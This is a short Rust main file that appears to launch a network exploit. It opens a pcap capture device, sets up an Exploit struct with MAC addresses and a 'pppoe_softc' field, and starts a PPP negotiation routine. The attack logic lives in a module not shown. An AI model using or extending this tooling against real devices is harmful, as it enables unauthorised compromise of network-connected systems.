mod constants;
mod exploit;
mod macaddress;
use macaddress::MacAddress64;
use pcap::Device;

use crate::exploit::Exploit;

fn main() {
    // Cap device
    let cap = Device::lookup().unwrap().unwrap().open().unwrap();

    let mut exploit = Exploit {
        target_mac: MacAddress64::from_u64(0),
        pppoe_softc: 0,
        source_mac: MacAddress64([41, 41, 41, 41, 41, 41, 41, 41]),
    };

    exploit.ppp_negotiation(cap);
}
